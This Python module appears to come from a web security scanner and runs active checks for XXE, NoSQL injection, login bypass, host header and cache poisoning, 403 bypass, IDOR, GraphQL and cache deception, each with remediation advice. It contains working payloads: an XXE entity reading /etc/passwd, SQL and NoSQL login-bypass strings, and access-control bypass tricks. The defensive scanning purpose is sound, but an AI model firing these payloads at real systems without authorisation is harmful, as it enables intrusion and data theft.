"""Additional active checks: XXE, NoSQL injection, login bypass, host header / cache poisoning,
403 bypass, IDOR heuristics and GraphQL.

Same principles as the core checks: a baseline for comparison, values the server must
compute/return, and a random canary per test so reflections can't fake a positive.
"""

from __future__ import annotations

import json
import random
import re
from urllib.parse import urlsplit, urlunsplit

from webguard.detection.baseline import similarity
from webguard.detection.checks.host import soft404
from webguard.detection.context import Context, token
from webguard.http import Resp
from webguard.models import DIFFERENTIAL, SIGNATURE, Confidence, Finding, InjectionPoint, Severity

JWT_RX = re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{0,}")

# ------------------------------------------------------------------------------ XXE

XXE_FILE = ('<?xml version="1.0"?><!DOCTYPE wg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<{root}><{field}>&xxe;</{field}></{root}>")
XXE_PARAM_ERROR = re.compile(r"(?i)(?:SAXParseException|XMLSyntaxError|lxml\.etree|libxml|DOCTYPE is (?:not allowed|disallowed)|"
                             r"External entity|org\.xml\.sax|System\.Xml\.XmlException|simplexml_load_string|"
                             r"DOMDocument::loadXML|XML parsing error|Unexpected token .{0,20}<)")
PASSWD = re.compile(r"root:[^:\n]*:0:0:")


async def xxe(ctx: Context, url: str, method: str = "POST") -> None:
    if ctx.has("xxe", url=url):
        return
    base = await ctx.client.safe_get(url)
    if base is not None and PASSWD.search(base.text):
        return
    for ctype in ("application/xml", "text/xml"):
        body = XXE_FILE.format(root="root", field="name")
        try:
            r = await ctx.client.request(method, url, content=body, headers={"Content-Type": ctype})
        except Exception:
            return
        if r is None:
            return
        if PASSWD.search(r.text):
            ctx.report(Finding(
                check="xxe", title="XML external entity injection (file disclosure)", severity=Severity.HIGH,
                confidence=Confidence.CERTAIN, url=url, method=method, location="body", payload=body,
                evidence="External entity resolved: /etc/passwd contents returned.",
                description="The XML parser resolves external entities, allowing arbitrary file reads, SSRF and "
                            "sometimes denial of service.",
                remediation="Disable DTDs and external entity resolution in the XML parser (e.g. "
                            "defusedxml, XMLConstants.FEATURE_SECURE_PROCESSING, LIBXML_NONET).",
                cwe="CWE-611", owasp="A05:2021-Security Misconfiguration", detection=SIGNATURE,
                references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                tags=["xxe", "injection"],
                request=ctx.client.curl(method, url, headers={"Content-Type": ctype}, content=body),
            ))
            return
        m = XXE_PARAM_ERROR.search(r.text)
        if m:
            ctx.report(Finding(
                check="xxe", title="Endpoint parses attacker-supplied XML", severity=Severity.INFO,
                confidence=Confidence.TENTATIVE, url=url, method=method, location="body", payload=body,
                evidence=f"XML parser message: {m.group(0)}",
                description="The endpoint processes XML input. External entities were not confirmed, but blind/"
                            "OOB XXE should be tested manually (e.g. with an interaction server).",
                remediation="Disable DTD processing if XML input is required.",
                cwe="CWE-611", detection=SIGNATURE, tags=["xxe", "hunting"],
            ))
            return

# ------------------------------------------------------------------------------ NoSQL injection

NOSQL_ERRORS = re.compile(r"(?i)(?:MongoError|MongoServerError|Cast to ObjectId failed|unknown operator: \$|"
                          r"\$where|BSONTypeError|E11000|CastError|MongooseError|bad query|"
                          r"cannot apply \$\w+ to|SyntaxError: Unexpected token .{0,30} in JSON)")


async def nosqli(ctx: Context, point: InjectionPoint) -> None:
    if ctx.has("nosqli", point) or point.location not in ("query", "form", "json"):
        return
    base = await ctx.baseline(point)
    if base is None or any(NOSQL_ERRORS.search(s.text) for s in base.samples):
        return
    rnd = token(6)

    async def send_operator(op: str, value: object) -> Resp | None:
        if point.location == "json":
            body = dict(point.params)
            body[point.name] = {op: value}
            return await ctx.client.request(point.method, point.url, json=body)
        params = {k: v for k, v in point.params.items() if k != point.name}
        params[f"{point.name}[{op}]"] = str(value)
        if point.method.upper() == "GET" or point.location == "query":
            return await ctx.client.request("GET", point.url, params=params)
        return await ctx.client.request(point.method, point.url, data=params)

    try:
        r_ne = await send_operator("$ne", rnd)
        r_eq = await send_operator("$eq", rnd)
        r_plain = await ctx.send(point, rnd)
        r_regex = await send_operator("$regex", ".*")
    except Exception:
        return
    if not (r_ne and r_eq and r_plain):
        return
    if not all(ctx.app_answered(r, point, "nosqli") for r in (r_ne, r_eq, r_plain)):
        return
    for r in (r_ne, r_eq, r_regex):
        if r is not None and NOSQL_ERRORS.search(r.text):
            m = NOSQL_ERRORS.search(r.text)
            ctx.report(_nosql_finding(ctx, point, f"{point.name}[$ne]={rnd}", f"Database error: {m.group(0)}",
                                      Confidence.FIRM))
            return
    # $ne:random matches everything; $eq:random and the plain random value match nothing
    eq_like_plain = r_eq.status == r_plain.status and similarity(r_eq.text, r_plain.text, [rnd]) > 0.9
    ne_differs = r_ne.status != r_plain.status or similarity(r_ne.text, r_plain.text, [rnd]) < 0.75
    ne_bigger = len(r_ne.text) > len(r_plain.text) * 1.2 or (r_ne.status < 300 <= r_plain.status)
    if eq_like_plain and ne_differs and ne_bigger:
        # confirm once more with a fresh value
        rnd2 = token(6)
        r_ne2 = await send_operator("$ne", rnd2)
        if r_ne2 is not None and similarity(r_ne2.text, r_ne.text, [rnd, rnd2]) > 0.9:
            ctx.report(_nosql_finding(
                ctx, point, f"{point.name}[$ne]={rnd}",
                f"Operator injection changes the result set: $ne returned {len(r_ne.text)} bytes/HTTP {r_ne.status}, "
                f"$eq and plain value returned {len(r_plain.text)} bytes/HTTP {r_plain.status}.", Confidence.FIRM))


def _nosql_finding(ctx, point, payload, evidence, conf):
    return Finding(
        check="nosqli", title="NoSQL operator injection", severity=Severity.HIGH, confidence=conf,
        url=point.url, method=point.method, parameter=point.name, location=point.location, payload=payload,
        evidence=evidence,
        description="Query operators ($ne, $gt, $regex, ...) supplied by the user reach the NoSQL database, "
                    "allowing authentication bypass and data extraction.",
        remediation="Cast inputs to the expected primitive type, reject objects/arrays where scalars are expected, "
                    "and use query builders that do not interpret user-supplied operators (e.g. mongo-sanitize).",
        cwe="CWE-943", owasp="A03:2021-Injection", detection=DIFFERENTIAL,
        references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"],
        tags=["nosqli", "injection"], request=ctx.curl(point, payload),
    )

# ------------------------------------------------------------------------------ authentication bypass

LOGIN_PATH = re.compile(r"(?i)(?:log[-_]?in|sign[-_]?in|auth(?:enticate)?|session|token)(?:/|$|\?|\.)")
USER_FIELDS = ("email", "username", "user", "login", "mail", "name", "userName", "user_name", "account")
PASS_FIELDS = ("password", "pass", "passwd", "pwd")
SQL_BYPASS = ["' OR 1=1-- -", "' OR '1'='1'-- -", "admin'-- -", "' OR 1=1#", "\" OR 1=1-- -", "') OR ('1'='1'-- -"]
SUCCESS_HINT = re.compile(r"(?i)\"(?:token|access_token|accessToken|jwt|authentication|session|id_token)\"\s*:|"
                          r"welcome back|logout|sign out|dashboard")


def login_fields(params: dict[str, str]) -> tuple[str | None, str | None]:
    user = next((k for k in params if k.lower() in {f.lower() for f in USER_FIELDS}), None)
    pwd = next((k for k in params if k.lower() in PASS_FIELDS), None)
    return user, pwd


async def auth_bypass(ctx: Context, url: str, method: str, params: dict[str, str], location: str) -> None:
    """Try SQL/NoSQL authentication bypass on a login endpoint (one request per payload)."""
    if ctx.has("auth", url=url):
        return
    user_f, pass_f = login_fields(params)
    if not user_f or not pass_f:
        return

    async def attempt(user_value: object, pass_value: object) -> Resp | None:
        body = dict(params)
        body[user_f], body[pass_f] = user_value, pass_value
        try:
            if location == "json":
                return await ctx.client.request(method, url, json=body)
            return await ctx.client.request(method, url, data={k: str(v) for k, v in body.items()})
        except Exception:
            return None

    fails = [await attempt(f"{token(5)}@example.com", token(10)) for _ in range(2)]
    fails = [f for f in fails if f is not None]
    if not fails or SUCCESS_HINT.search(fails[0].text) and fails[0].status < 300:
        return  # can't distinguish success from failure
    fail = fails[0]
    candidates: list[tuple[object, object, str]] = [(p, token(8), "SQL injection") for p in SQL_BYPASS]
    if location == "json":
        candidates += [({"$ne": None}, {"$ne": None}, "NoSQL operator injection"),
                       ({"$gt": ""}, {"$gt": ""}, "NoSQL operator injection")]
    for user_v, pass_v, kind in candidates:
        r = await attempt(user_v, pass_v)
        if r is None:
            continue
        status_flip = fail.status >= 400 and r.status < 400
        new_session = any("set-cookie" == k.lower() for k in r.headers.keys()) and not any(
            "set-cookie" == k.lower() for k in fail.headers.keys())
        token_issued = bool(JWT_RX.search(r.text)) or bool(SUCCESS_HINT.search(r.text) and not SUCCESS_HINT.search(fail.text))
        differs = similarity(r.text, fail.text) < 0.6
        if (status_flip or (differs and new_session)) and (token_issued or new_session):
            from webguard.detection.checks import analyzers

            analyzers.jwt(ctx, r)  # inspect the token we were issued (claims often leak hashes/roles)
            payload = json.dumps({user_f: user_v, pass_f: pass_v}) if location == "json" else f"{user_f}={user_v}"
            ctx.report(Finding(
                check="auth", title=f"Authentication bypass via {kind}", severity=Severity.CRITICAL,
                confidence=Confidence.CERTAIN if token_issued else Confidence.FIRM,
                url=url, method=method, parameter=user_f, location=location, payload=payload,
                evidence=f"Invalid credentials -> HTTP {fail.status}; injected credentials -> HTTP {r.status}"
                         f"{' with a session token' if token_issued else ''}.",
                description="The login query is built from user input, so an attacker can log in as an existing "
                            "user (often the first user, typically an administrator) without knowing a password.",
                remediation="Use parameterised queries / typed ORM lookups for authentication; compare password "
                            "hashes in application code; reject non-string credential types.",
                cwe="CWE-89" if kind.startswith("SQL") else "CWE-943", owasp="A07:2021-Identification and Authentication Failures",
                detection=SIGNATURE, tags=["auth", "bypass", "sqli" if kind.startswith("SQL") else "nosqli"],
                request=ctx.client.curl(method, url, json_body={**params, user_f: user_v, pass_f: pass_v})
                if location == "json" else ctx.client.curl(method, url, data={**params, user_f: str(user_v), pass_f: str(pass_v)}),
            ))
            return

# ------------------------------------------------------------------------------ host header / cache poisoning

CACHEABLE = re.compile(r"(?i)\b(?:public|s-maxage=\d+|max-age=[1-9])")


async def host_header(ctx: Context, url: str) -> None:
    if ctx.has("host_header", url=url):
        return
    c = token(6)
    evil = f"{c}.example.org"
    buster = {"wgcb": token(6)}  # cache buster: never poison the real cache key
    for header in ("X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "Host"):
        try:
            r = await ctx.client.request("GET", url, params=buster, headers={header: evil})
        except Exception:
            return
        if r is None:
            continue
        loc = r.headers.get("location", "")
        if evil not in r.text and evil not in loc:
            continue
        cc = r.headers.get("cache-control", "")
        cached = (CACHEABLE.search(cc) and "private" not in cc and "no-store" not in cc) or "age" in r.headers or \
            "x-cache" in r.headers
        poisoning = bool(cached) and header != "Host"
        ctx.report(Finding(
            check="host_header",
            title="Web cache poisoning via unkeyed header" if poisoning else f"Host header injection ({header})",
            severity=Severity.HIGH if poisoning else Severity.MEDIUM, confidence=Confidence.CERTAIN if not poisoning else Confidence.FIRM,
            url=url, payload=f"{header}: {evil}",
            evidence=f"Injected host reflected in {'Location header' if evil in loc else 'response body'}"
                     f"{'; response is cacheable (' + cc + ')' if cached else ''}.",
            description="The application builds absolute URLs from a client-controlled host header. This enables "
                        "password-reset link poisoning, and if the response is cached, poisoning for all users.",
            remediation="Use a configured canonical host for absolute URLs; ignore X-Forwarded-* unless set by a "
                        "trusted proxy; include such headers in the cache key or strip them at the edge.",
            cwe="CWE-644", owasp="A05:2021-Security Misconfiguration", detection=SIGNATURE,
            references=["https://portswigger.net/web-security/host-header", "https://portswigger.net/research/practical-web-cache-poisoning"],
            tags=["host-header", "cache-poisoning" if poisoning else "host"],
            request=ctx.client.curl("GET", url + f"?wgcb={buster['wgcb']}", headers={header: evil}),
        ))
        return

# ------------------------------------------------------------------------------ 403 bypass


def _bypass_variants(url: str) -> list[tuple[str, dict[str, str], str]]:
    p = urlsplit(url)
    path = p.path.rstrip("/") or "/"
    root = f"{p.scheme}://{p.netloc}"
    last = path.rsplit("/", 1)
    variants = [
        (root + path + "/.", {}, "trailing /."),
        (root + "/" + path.lstrip("/") + "/", {}, "trailing slash"),
        (root + "/%2e" + path, {}, "/%2e prefix"),
        (root + path + "..;/", {}, "..;/ (Tomcat path parameter)"),
        (root + path + ";/", {}, ";/ suffix"),
        (root + "//" + path.lstrip("/"), {}, "double slash"),
        (root + (last[0] + "/" + last[1].upper() if len(last) == 2 else path), {}, "case change"),
        (root + "/", {"X-Original-URL": path}, "X-Original-URL"),
        (root + "/", {"X-Rewrite-URL": path}, "X-Rewrite-URL"),
        (url, {"X-Forwarded-For": "127.0.0.1"}, "X-Forwarded-For: 127.0.0.1"),
        (url, {"X-Real-IP": "127.0.0.1"}, "X-Real-IP: 127.0.0.1"),
        (url, {"X-Custom-IP-Authorization": "127.0.0.1"}, "X-Custom-IP-Authorization"),
    ]
    return [(urlunsplit(urlsplit(u)._replace(query=p.query)), h, d) for u, h, d in variants]


async def forbidden_bypass(ctx: Context, url: str, blocked: Resp) -> None:
    if ctx.has("access", url=url) or blocked.status not in (401, 403):
        return
    root = "{0.scheme}://{0.netloc}".format(urlsplit(url))
    fps = await soft404(ctx, root)
    home = await ctx.client.safe_get(root + "/")
    for vurl, headers, desc in _bypass_variants(url):
        try:
            r = await ctx.client.request("GET", vurl, headers=headers or None)
        except Exception:
            continue
        if r is None or r.status != 200 or len(r.text) < 50 or not ctx.app_answered(r):
            continue
        if similarity(r.text, blocked.text) > 0.8:
            continue
        if any(similarity(r.text, fp.text) > 0.85 for fp in fps) or (home and similarity(r.text, home.text) > 0.85):
            continue  # SPA fallback / soft-404 / homepage, not the protected resource
        ctx.report(Finding(
            check="access", title=f"Access control bypass ({desc})", severity=Severity.MEDIUM,
            confidence=Confidence.FIRM, url=url, payload=f"{vurl} {headers or ''}".strip(),
            evidence=f"Original: HTTP {blocked.status}; variant: HTTP 200 ({len(r.text)} bytes, distinct from "
                     f"error/soft-404 pages).",
            description="A front-end/proxy access rule is enforced on the literal path only; normalisation "
                        "differences or override headers reach the protected resource.",
            remediation="Enforce authorisation in the application on the canonical, normalised path; strip "
                        "X-Original-URL/X-Rewrite-URL and client-supplied IP headers at the edge.",
            cwe="CWE-863", owasp="A01:2021-Broken Access Control", detection=DIFFERENTIAL,
            tags=["access-control", "403-bypass"], request=ctx.client.curl("GET", vurl, headers=headers or None),
        ))
        return

# ------------------------------------------------------------------------------ IDOR heuristic

PII_KEYS = re.compile(r"(?i)^(?:e?mail|email_?address|phone|mobile|address|street|ssn|dob|birth.*|first_?name|"
                      r"last_?name|full_?name|card.*|iban|account_?number|salary|password.*|username)$")
ID_SEGMENT = re.compile(r"/(\d{1,9})(?=/|$)")


def _pii_keys(obj) -> set[str]:
    keys: set[str] = set()
    if isinstance(obj, dict):
        for k, v in obj.items():
            if PII_KEYS.match(str(k)) and v not in (None, "", []):
                keys.add(str(k))
            keys |= _pii_keys(v)
    elif isinstance(obj, list):
        for item in obj[:5]:
            keys |= _pii_keys(item)
    return keys


async def idor(ctx: Context, url: str, resp: Resp) -> None:
    """Unauthenticated/horizontal access heuristic: neighbouring object ids return other records with PII."""
    if ctx.has("idor", url=url) or "json" not in resp.content_type or resp.status != 200:
        return
    m = ID_SEGMENT.search(urlsplit(url).path)
    if not m:
        return
    try:
        data = json.loads(resp.text)
    except ValueError:
        return
    pii = _pii_keys(data)
    if not pii:
        return
    n = int(m.group(1))
    hits, last_url = 0, url
    for other in (n + 1, max(1, n - 1) if n > 1 else n + 2):
        parts = urlsplit(url)
        other_url = urlunsplit(parts._replace(path=parts.path[: m.start(1)] + str(other) + parts.path[m.end(1):]))
        r = await ctx.client.safe_get(other_url)
        if r is None or r.status != 200 or "json" not in r.content_type:
            continue
        try:
            other_data = json.loads(r.text)
        except ValueError:
            continue
        if _pii_keys(other_data) and other_data != data:
            hits += 1
            last_url = other_url
    if hits:
        auth = "with the configured session" if (ctx.config.headers or ctx.config.cookies) else "without authentication"
        ctx.report(Finding(
            check="idor", title="Possible IDOR: enumerable records with personal data", severity=Severity.MEDIUM,
            confidence=Confidence.TENTATIVE, url=url, location="path", parameter="id",
            evidence=f"Neighbouring ids return different records {auth}; PII fields: {', '.join(sorted(pii))}.",
            description="Object identifiers are sequential and records containing personal data are returned for "
                        "other ids. Verify with two separate accounts whether object-level authorisation is enforced.",
            remediation="Enforce object-level authorisation on every lookup (owner/tenant check); prefer "
                        "non-guessable identifiers as defence in depth.",
            cwe="CWE-639", owasp="A01:2021-Broken Access Control", detection=DIFFERENTIAL,
            tags=["idor", "access-control", "hunting"], request=ctx.client.curl("GET", last_url),
        ))

# ------------------------------------------------------------------------------ GraphQL


async def graphql(ctx: Context, url: str) -> None:
    if ctx.has("graphql", url=url):
        return
    try:
        r = await ctx.client.request("POST", url, json={"query": "{__schema{queryType{name}types{name}}}"})
    except Exception:
        return
    if r is not None and r.status == 200 and '"queryType"' in r.text:
        types = re.findall(r'"name"\s*:\s*"([A-Za-z_]\w*)"', r.text)
        ctx.report(Finding(
            check="graphql", title="GraphQL introspection enabled", severity=Severity.LOW, confidence=Confidence.CERTAIN,
            url=url, payload="{__schema{queryType{name}}}", evidence=f"Schema returned ({len(types)} types).",
            description="Introspection reveals the full API schema, including hidden/admin operations.",
            remediation="Disable introspection in production or restrict it to authenticated developers.",
            cwe="CWE-200", owasp="A05:2021-Security Misconfiguration", detection=SIGNATURE, tags=["graphql"],
        ))
    batch = [{"query": "{__typename}"} for _ in range(random.randint(3, 5))]
    try:
        rb = await ctx.client.request("POST", url, json=batch)
    except Exception:
        return
    if rb is not None and rb.status == 200 and rb.text.strip().startswith("[") and rb.text.count("__typename") >= len(batch):
        ctx.report(Finding(
            check="graphql", title="GraphQL query batching enabled", severity=Severity.LOW, confidence=Confidence.CERTAIN,
            url=url + "#batching", payload=json.dumps(batch), evidence=f"{len(batch)} batched queries answered in one request.",
            description="Batching lets attackers bypass per-request rate limits (e.g. brute-forcing OTPs/passwords).",
            remediation="Limit batch size and apply rate limiting per operation, not per HTTP request.",
            cwe="CWE-799", detection=SIGNATURE, tags=["graphql", "rate-limit"],
        ))

# ------------------------------------------------------------------------------ web cache deception

CACHE_HIT = re.compile(r"(?i)\bhit\b")
WCD_SUFFIXES = [  # path-confusion forms from "Gotta cache 'em all" (PortSwigger, 2024)
    ("/{r}.css", "extra path segment"),
    (";{r}.css", "';' delimiter (Java/Spring matrix params)"),
    ("%23{r}.css", "encoded '#' delimiter"),
    ("%3f{r}.css", "encoded '?' delimiter"),
    (".{r}.css", "'.' extension confusion"),
    ("%00{r}.css", "encoded NUL delimiter"),
]


def _cached(resp: Resp) -> bool:
    h = {k.lower(): v for k, v in resp.headers.items()}
    if any(CACHE_HIT.search(h.get(k, "")) for k in ("x-cache", "cf-cache-status", "x-cache-status", "x-proxy-cache",
                                                     "akamai-cache-status", "cdn-cache")):
        return True
    age = h.get("age", "")
    return age.isdigit() and int(age) > 0


async def cache_deception(ctx: Context, url: str, original: Resp, authenticated: bool) -> None:
    """Does a static-looking suffix return the dynamic page AND get stored by a cache?

    Each probe uses a unique random file name, so only WebGuard's own response is ever cached.
    """
    if ctx.has("cache_deception", url=url) or original.status != 200 or not original.is_html:
        return
    base = url.split("?")[0].split("#")[0].rstrip("/")
    again = await ctx.client.safe_get(url)
    # how similar the page is to itself (dynamic content); the confused path must match at least that well
    stability = similarity(again.text, original.text) if again is not None else 1.0
    fps = await soft404(ctx, "{0.scheme}://{0.netloc}".format(urlsplit(url)))
    for suffix, desc in WCD_SUFFIXES:
        probe = base + suffix.format(r=token(8))
        r1 = await ctx.client.safe_get(probe)
        if r1 is None or r1.status != 200 or similarity(r1.text, original.text) < stability - 0.1:
            continue
        if any(fp.status == 200 and similarity(r1.text, fp.text) > 0.9 for fp in fps):
            continue  # catch-all/SPA fallback: every path returns the same shell, not a confusion bug
        r2 = await ctx.client.safe_get(probe)
        if r2 is None or not _cached(r2):
            continue
        sev = Severity.HIGH if authenticated else Severity.LOW
        ctx.report(Finding(
            check="cache_deception", title=f"Web cache deception ({desc})", severity=sev,
            confidence=Confidence.FIRM, url=url, payload=probe,
            evidence=f"{probe} returns the dynamic page and the second request is served from cache "
                     f"({', '.join(f'{k}: {v}' for k, v in r2.headers.items() if k.lower() in ('x-cache', 'cf-cache-status', 'age', 'cache-control'))}).",
            description="The cache treats the URL as a static file while the origin serves the dynamic page. An "
                        "attacker who makes a victim open the crafted link can then fetch the victim's cached, "
                        "personalised response." + ("" if authenticated else
                                                   " Re-test with a session (-H/--cookie) to confirm personal data is cached."),
            remediation="Cache only by explicit Cache-Control from the origin; make the origin return 404 for unknown "
                        "path suffixes/delimiters; align cache and origin URL parsing.",
            cwe="CWE-524", owasp="A04:2021-Insecure Design", detection=DIFFERENTIAL,
            references=["https://portswigger.net/research/gotta-cache-em-all",
                        "https://portswigger.net/web-security/web-cache-deception"],
            tags=["cache", "cache-deception"], request=ctx.client.curl("GET", probe),
        ))
        return
